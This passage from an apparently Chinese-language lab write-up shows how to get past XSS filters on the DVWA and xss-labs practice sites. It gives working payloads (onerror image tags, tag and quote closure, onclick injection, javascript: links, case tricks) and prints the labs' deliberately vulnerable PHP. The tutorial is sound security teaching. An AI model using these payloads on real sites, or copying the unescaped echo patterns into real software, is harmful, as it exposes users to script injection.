src=\"..\\..\\static\\image\\f84e8f789d04151571429f28a752e95c.png\"/></p>\n<p>当我们选择某个选项比如English之后URL中就有default=English字样了</p>\n<p>此时if判断正确,会多给两个选项,其一是URL中的值English,其二是不可选的选项分割线----,然后顺次打印刚才的四个选项</p>\n<p><img alt=\"image-20220304113210079\" src=\"..\\..\\static\\image\\5888a5dfe1c3b8cc97e879608b956b56.png\"/></p>\n<p>到此前端的逻辑分析完毕</p>\n<p>考虑dom型xss攻击和反射型xss攻击的区别?</p>\n<p>感觉本质上相同,都是通过修改表单发生的,</p>\n<p>不过反射型有时表单是可以随意输入text的文本框,直接输入xss攻击语句即可</p>\n<p>dom型有时没有text文本框,并且看似只有固定的选项,不能自由输入xss攻击语句,但是通过域名行修改get表单或者抓包修改post表单仍然可以传入xss攻击语句</p>\n<h2><a id=\"_292\"></a>绕过方法</h2>\n<h3><a id=\"_294\"></a>使用事件</h3>\n<h4><a id=\"DVWAmediumXssReflected_296\"></a>DVWA靶场medium等级Xss(Reflected)</h4>\n<p><img alt=\"image-20220304114113163\" src=\"..\\..\\static\\image\\6bfa684ad476574b6c69be7338f02f38.png\"/></p>\n<p>发现直接将name的值改为xss语句是行不通的, 尝试将alert函数改为prompt等等其他函数也是不可以的</p>\n<p>观察回显Hello alert(0),推测<strong>后端过滤掉了<code>&lt;script&gt;&lt;/script&gt;</code>标签</strong>,可以用dom事件处理函数执行js脚本,比如onerror</p>\n<p>onerror的作用是某个dom组件加载失败后执行onerror句柄指向的函数,比如:</p>\n<pre><code>&lt;img src=1 onerror=alert(0)&gt;\n</code></pre>\n<p>作用是加载一张图片,其位置是1(显然是个莫须有的位置),如果发生错误则执行alert(0)</p>\n<p><img alt=\"image-20220304114849511\" src=\"..\\..\\static\\image\\67da731f2ecb0589ef5c5dfe86543f3c.png\"/></p>\n<p>成功绕过</p>\n<p>查看后端代码:</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\nheader <span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"X-XSS-Protection: 0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Is there any input?</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">array_key_exists</span><span class=\"token punctuation\">(</span> <span class=\"token double-quoted-string string\">\"name\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token single-quoted-string string\">'name'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">NULL</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token comment\">// Get input</span>\n    <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span> <span class=\"token single-quoted-string string\">'&lt;script&gt;'</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token single-quoted-string string\">'name'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//此处用空字符替换了&lt;script&gt;标签</span>\n\n    <span class=\"token comment\">// Feedback for end user</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;pre&gt;Hello ${name}&lt;/pre&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token delimiter important\">?&gt;</span> \n</code></pre>\n<p>发现后端确实过滤了<code>&lt;script&gt;</code></p>\n<h3><a id=\"_337\"></a>闭合标签</h3>\n<h4><a id=\"xsslabslevel2_339\"></a>xss-labs靶场level2</h4>\n<p><img alt=\"image-20220304151237673\" src=\"..\\..\\static\\image\\23ca0439f14b86d1779016b3f5980928.png\"/></p>\n<p>直接在text框中输入<code>&lt;script&gt;alert(0)&lt;/script&gt;</code>发现没有被执行而是整个被当作字符串打印了,</p>\n<p>查看前端代码:</p>\n<pre><code class=\"prism language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>level2.php</span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>GET</span><span class=\"token punctuation\">&gt;</span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>keyword</span>  <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>&lt;script&gt;alert(0)&lt;script&gt;<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>submit</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>submit</span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>搜索<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre>\n<p>发现第二行value的值自动带上了双引号,我们可以办一些手续让双引号不起作用</p>\n<p>首先这个双引号是前端带上的还是后端带上的呢?</p>\n<p>input标签中value属性的作用是为输入框设置初始值,比如</p>\n<p><img alt=\"\" src=\"..\\..\\static\\image\\a0d77f7cd55405e4e4914f2bd74ae1f7.png\"/></p>\n<p>value值带上双引号肯定是level2.php中实现的</p>\n<p>此时我们不知道后端是如何实现的,用课程上学习的闭合标签进行忙猜</p>\n<pre><code>\"&gt;&lt;img src=0 onerror=alert(0)&gt;\n'&gt;&lt;img src=0 onerror=alert(0)&gt;\n</code></pre>\n<p>结果成功了</p>\n<p><img alt=\"image-20220304153002471\" src=\"..\\..\\static\\image\\91948574998fad93c2b7077fc725df3d.png\"/></p>\n<p>接下来我们需要看一看后端干了什么,或者说怎么根据后端的吃相套路他</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n\t<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n\t\t\t\t\t\t\t\t\t<span class=\"token comment\">//注意此处这个点,作用是连接后面这一大坨(从&lt;center&gt;开始到&lt;/center&gt;结束)</span>\n\t<span class=\"token keyword\">echo</span> \n        <span class=\"token double-quoted-string string\">\"&lt;h2 align=center&gt;没有找到和\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\"相关的结果.&lt;/h2&gt;\"</span><span class=\"token punctuation\">.</span>\n    \t<span class=\"token single-quoted-string string\">'&lt;center&gt;\n\t\t\t&lt;form action=level2.php method=GET&gt;\n\t\t\t\t&lt;input name=keyword  value=\"'</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">.</span><span class=\"token single-quoted-string string\">'\"&gt;\n\t\t\t\t&lt;input type=submit name=submit value=\"搜索\"/&gt;\n\t\t\t&lt;/form&gt;\n\t\t&lt;/center&gt;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<p>根据回显<code>\"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".</code></p>\n<p>这个回显中htmlspecialchars函数起到了作用,没有在该行出现xss漏洞.</p>\n<p>但是后面的回显<code>&lt;input name=keyword value=\"'.$str.'\"&gt;</code>这里就有问题了,直接将<code>\" '.$str.' \"</code>拼在一起来显示,自然可以办一些手续把<code>$str</code>从引号堆里救出来让他发挥作用</p>\n<p><strong>我一开始认为</strong>:</p>\n<p>(一开始的认为并不是闭合标签)</p>\n<p>注意最左边有个双引号,如果<code>$str=\"balabala</code>,那么这里就变成<code>\"'.\" balabala .'\"</code>最左侧两个双引号闭合了,单引号和点号都成了字符串,此时如果balabala中有命令就会执行了.</p>\n<p>但是事实上没有执行</p>\n<p><img alt=\"image-20220304160234889\" src=\"..\\..\\static\\image\\33d0898d93663ce2ebba6335cb374096.png\"/></p>\n<p><strong>为什么呢?</strong></p>\n<p>再看这句<code>&lt;input name=keyword value=\"'.$str.'\"&gt;</code>,即使把<code>$str</code>从引号堆里就出来,但是它仍然是input标签中的错误值(<code>value</code>有了<code>'.</code>作为值,但是<code>$str'\"</code>是连键都没有值),不会被执行.</p>\n<p>要把$str从标签中救出来(其实也有在标签内部的方法,level3就用到了,在level2先使用闭合标签的方法)</p>\n<p>要把$str从标签中救出来,就需要让他前面的input标签闭合.</p>\n<p>如果直接输入<code>&gt;balabala</code>,这不会被当成闭合标签,因为<code>&gt;balabala</code>仍然被引号包围.</p>\n<p>也就是说首先要把<code>&gt;balabala</code>从引号中救出来,然后把<code>balabala</code>从标签中救出来</p>\n<p>这样推理,写<code>\"&gt;balabala</code>就可以救两次了</p>\n<p>我们写入<code>\"&gt;&lt;script&gt;alert(0)&lt;/script&gt;</code></p>\n<p>(这里balabala=<code>&lt;script&gt;alert(0)&lt;/script&gt;</code>)</p>\n<p><img alt=\"image-20220304160804957\" src=\"..\\..\\static\\image\\1422e7d3f9544bb479682db00df458fb.png\"/></p>\n<p>成功了</p>\n<h3><a id=\"htmlspecialchars_438\"></a>闭合引号,绕过htmlspecialchars()函数</h3>\n<h4><a id=\"xsslabslevel3_440\"></a>xss-labs靶场level3</h4>\n<p>在这个靶场上用尽我学过的那一丁点知识也没解出来,看了看后端代码</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n\t<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">echo</span> \n\t\t<span class=\"token double-quoted-string string\">\"&lt;h2 align=center&gt;没有找到和\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\"相关的结果.&lt;/h2&gt;\"</span><span class=\"token punctuation\">.</span>\n\t\t<span class=\"token double-quoted-string string\">\"&lt;center&gt;\n\t\t\t&lt;form action=level3.php method=GET&gt;\n\t\t\t\t&lt;input name=keyword  value='\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\"'&gt;\t\n\t\t\t\t&lt;input type=submit name=submit value=搜索 /&gt;\n\t\t\t&lt;/form&gt;\n\t\t&lt;/center&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<p>hjh两个回显位置都给用了htmlspecialchars函数,看来必须要和这个函数打交道了.</p>\n<p><a href=\"https://www.php.net/manual/zh/function.htmlspecialchars.php\">php手册资料</a></p>\n<pre><code class=\"prism language-php\"><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span>\n    string <span class=\"token variable\">$string</span><span class=\"token punctuation\">,</span>\n    int <span class=\"token variable\">$flags</span> <span class=\"token operator\">=</span> <span class=\"token constant\">ENT_COMPAT</span> <span class=\"token operator\">|</span> <span class=\"token constant\">ENT_HTML401</span><span class=\"token punctuation\">,</span>\n    string <span class=\"token variable\">$encoding</span> <span class=\"token operator\">=</span> <span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"default_charset\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    bool <span class=\"token variable\">$double_encode</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> string\n</code></pre>\n<pre><code>执行转换\n字符\t替换后\n&amp; (&amp; 符号)\t&amp;amp;\n\" (双引号)\t&amp;quot;，除非设置了 ENT_NOQUOTES\n' (单引号)\t设置了 ENT_QUOTES 后， &amp;#039; (如果是 ENT_HTML401) ，或者 &amp;apos; (如果是 ENT_XML1、 ENT_XHTML 或ENT_HTML5)。\n&lt; (小于)\t&amp;lt;\n&gt; (大于)\t&amp;gt;\n</code></pre>\n<table><thead><tr><th align=\"left\">常量名称</th><th align=\"left\">描述</th></tr></thead><tbody><tr><td align=\"left\"><strong><code>ENT_COMPAT</code></strong></td><td align=\"left\">会转换双引号，不转换单引号。</td></tr><tr><td align=\"left\"><strong><code>ENT_QUOTES</code></strong></td><td align=\"left\">既转换双引号也转换单引号。</td></tr><tr><td align=\"left\"><strong><code>ENT_NOQUOTES</code></strong></td><td align=\"left\">单/双引号都不转换</td></tr><tr><td align=\"left\"><strong><code>ENT_IGNORE</code></strong></td><td align=\"left\">静默丢弃无效的代码单元序列，而不是返回空字符串。 不建议使用此标记， 因为它<a href=\"http://unicode.org/reports/tr36/#Deletion_of_Noncharacters\">» 可能有安全影响</a>。</td></tr><tr><td align=\"left\"><strong><code>ENT_SUBSTITUTE</code></strong></td><td align=\"left\">替换无效的代码单元序列为 Unicode 代替符（Replacement Character）， U+FFFD (UTF-8) 或者 � (其他)，而不是返回空字符串。</td></tr><tr><td align=\"left\"><strong><code>ENT_DISALLOWED</code></strong></td><td align=\"left\">为文档的无效代码点替换为 Unicode 代替符（Replacement Character）： U+FFFD (UTF-8)，或 �（其他），而不是把它们留在原处。 比如以下情况下就很有用：要保证 XML 文档嵌入额外内容时格式合法。</td></tr><tr><td align=\"left\"><strong><code>ENT_HTML401</code></strong></td><td align=\"left\">以 HTML 4.01 处理代码。</td></tr><tr><td align=\"left\"><strong><code>ENT_XML1</code></strong></td><td align=\"left\">以 XML 1 处理代码。</td></tr><tr><td align=\"left\"><strong><code>ENT_XHTML</code></strong></td><td align=\"left\">以 XHTML 处理代码。</td></tr><tr><td align=\"left\"><strong><code>ENT_HTML5</code></strong></td><td align=\"left\">以 HTML 5 处理代码。</td></tr></tbody></table>\n<p>既然不让我们用尖括号了,那么闭合标签是不可能的了,我们需要在<mark>标签内部完成事件处理</mark></p>\n<p>注意到缺省参数时不转化单引号,小括号,并且</p>\n<pre><code>在level2.php中:&lt;input name=keyword  value=\"'.$str.'\"&gt;\n在level3.php中:&lt;input name=keyword  value='\".htmlspecialchars($str).\"'&gt;\n</code></pre>\n<p>两个value的值中引号不同,level2中双引号在外,level3中单引号在外,</p>\n<p>这表明使用单引号做到引号闭合仍然是可行的</p>\n<p>如果<code>$str='onclick='alert(0)</code>那么</p>\n<p><code>&lt;input name=keyword value='\".htmlspecialchars($str).\"'&gt;</code>就变成了</p>\n<p><code>&lt;input name=keyword value='' onclick='alert(0)'&gt;</code></p>\n<blockquote>\n<p>注意\".htmlspecialchars($str).“这两边的”\"是php字符串的意思,并不显示在前端.</p>\n<p><mark>最内引号是php字符串,最内引号是php字符串,最内层引号是php字符串</mark></p>\n<p><img alt=\"image-20220304172217019\" src=\"..\\..\\static\\image\\bb89283457f31fa888961b0697f12d52.png\"/></p>\n<p>最外层双括号是php字符串的表示,打印到前端时去掉</p>\n</blockquote>\n<table><thead><tr><th>键</th><th>值</th></tr></thead><tbody><tr><td>name</td><td>keykword</td></tr><tr><td>value</td><td></td></tr><tr><td>onclick</td><td>alert(0)</td></tr></tbody></table>\n<p>那么在我们下一次点击该输入框时就会触发οnclick='alert(0)'弹窗警告</p>\n<h4><a id=\"xsslabslevel4_530\"></a>xss-labs靶场level4</h4>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n\t<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"&gt;\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"&lt;\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//$str3是去掉了所有简括号的$str</span>\n\t<span class=\"token keyword\">echo</span> \n\t\t<span class=\"token double-quoted-string string\">\"&lt;h2 align=center&gt;没有找到和\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\"相关的结果.&lt;/h2&gt;\"</span><span class=\"token punctuation\">.</span>\n\t\t<span class=\"token single-quoted-string string\">'&lt;center&gt;\n\t\t\t&lt;form action=level4.php method=GET&gt;\n\t\t\t\t&lt;input name=keyword  value=\"'</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">.</span><span class=\"token single-quoted-string string\">'\"&gt;\n\t\t\t\t&lt;input type=submit name=submit value=搜索 /&gt;\n\t\t\t&lt;/form&gt;\n\t\t&lt;/center&gt;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<p>我们希望在<code>&lt;input name=keyword value=\"'.$str3.'\"&gt;</code>这里做一些手续</p>\n<p>这里<code>$str3</code>是输入去掉所有尖括号得到的,没有经过htmlspecialchars等函数的处理,那么通过闭合引号应该可以做到</p>\n<p>注意到外层是双引号,内层php字符串使用的是单引号,那么我们只需要考虑闭合双引号</p>\n<pre><code>\"onclick=\"alert(0)\n</code></pre>\n<p>如此前端就成了:</p>\n<pre><code>&lt;input name=keyword  value=\"\"onclick=\"alert(0)\"&gt;\n</code></pre>\n<p><img alt=\"image-20220304185435035\" src=\"..\\..\\static\\image\\8b1b11ed2ce7745247207a9771964286.png\"/></p>\n<h3><a id=\"scripton_569\"></a>绕过对<code>script</code>和<code>on</code>的替换</h3>\n<h4><a id=\"xsslabslevel5_571\"></a>xss-labs靶场level5</h4>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n\t<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"&lt;script\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"&lt;scr_ipt\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"on\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"o_n\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">echo</span> \n\t\t<span class=\"token double-quoted-string string\">\"&lt;h2 align=center&gt;没有找到和\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\"相关的结果.&lt;/h2&gt;\"</span><span class=\"token punctuation\">.</span>\t\n\t\t<span class=\"token single-quoted-string string\">'&lt;center&gt;\n\t\t\t&lt;form action=level5.php method=GET&gt;\n\t\t\t\t&lt;input name=keyword  value=\"'</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">.</span><span class=\"token single-quoted-string string\">'\"&gt;\n\t\t\t\t&lt;input type=submit name=submit value=搜索 /&gt;\n\t\t\t&lt;/form&gt;\n\t\t&lt;/center&gt;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<p>这里后端的防范措施比level4中好点,</p>\n<p>把on替换掉的作用是事件处理函数比如<code>onclick,onmouseover</code>等不让用了,</p>\n<p>把<code>&lt;script</code>替换掉是不让用<code>&lt;script&gt;balabala&lt;/script&gt;</code>了</p>\n<p>我一开始的思路是寻找html中有没有其他能够调用js脚本的方法</p>\n<p>结果真的找到了,<a href=\"https://blog.csdn.net/weixin_40818589/article/details/81283426\">这位兄弟的博客</a></p>\n<pre><code class=\"prism language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>javascript:balabala<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre>\n<p>在本题中由于尖括号不受限制,可以使用闭合标签,</p>\n<p>对于<code>&lt;input name=keyword value=\"'.$str3.'\"&gt;</code>要考虑闭合引号和闭合标签</p>\n<pre><code class=\"prism language-php\"><span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token double-quoted-string string\">\"&gt;&lt;a href=\"</span>javascript<span class=\"token punctuation\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\"<span class=\"token operator\">&gt;</span>balabala<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a\n</code></pre>\n<blockquote>\n<p>注意这里javascript中也有script但是前面没有尖括号,所以不会匹配&lt;script这个模式</p>\n</blockquote>\n<p>这样写的话返回前端是这样的:</p>\n<pre><code class=\"prism language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>keyword</span>  <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>javascript:alert(0)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>link<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a\"</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre>\n<p>最后面这个<code>&lt;/a\"&gt;</code>标签是不规范的,但是竟然可以用</p>\n<p><img alt=\"image-20220304191338664\" src=\"..\\..\\static\\image\\0533fcfd782dbd88df0eb5f3f7320c54.png\"/></p>\n<p>但是为什么要<code>&lt;a href=\"javascript:balabala\"&gt;</code>这样写呢?href的值里面为啥要带上javascript:字样</p>\n<pre><code class=\"prism language-html\"><span class=\"token doctype\">&lt;!DOCTYPE html&gt;</span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span> <span class=\"token punctuation\">&gt;</span></span>Title<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>alert(0)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>link<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>javascript:alert(0)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>link<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre>\n<p>经过实验,第一个链接点击之后会跳转404not found页面</p>\n<p>第二个链接点击之后会弹窗警告</p>\n<p>为啥会这样?知乎上的回答:</p>\n<p><img alt=\"image-20220304213031964\" src=\"..\\..\\static\\image\\0bb53da07267033e719fb3d9636ced30.png\"/></p>\n<h3><a id=\"_650\"></a>大小写绕过</h3>\n<h4><a id=\"xsslabslevel5_652\"></a>修改xss-labs靶场level5</h4>\n<p>level5中<code>$str = strtolower($_GET[\"keyword\"]);</code>为什么无缘无故把输入全转为小写?考虑可能是有大小写绕过</p>\n<p>现在我们把level5.php中的<code>$str = strtolower($_GET[\"keyword\"]);</code>改成<code>$str = $_GET[\"keyword\"];</code>然后试验是否可以大小写绕过</p>\n<p>&lt;script和on都会被替换,那么&lt;SCRIPT和ON都不会被替换</p>\n<p><img alt=\"image-20220304193023051\" src=\"..\\..\\static\\image\\9089d4fba9b01fff8e3492e020b6c1fa.png\"/></p>\n<p>实验证明确实有效</p>\n<h4><a id=\"xsslabslevel6_664\"></a>xss-labs靶场level6</h4>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n\t<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token 